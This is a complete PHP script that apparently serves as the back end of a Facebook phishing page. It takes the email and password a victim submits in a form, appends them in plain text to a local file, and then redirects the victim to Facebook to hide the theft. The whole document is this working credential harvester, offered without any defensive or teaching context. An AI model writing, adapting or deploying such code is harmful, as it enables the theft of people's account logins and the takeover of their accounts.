<?php

file_put_contents("hemaa.txt", "email: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location:https:WWW.FACEBOOK.COM');
exit();
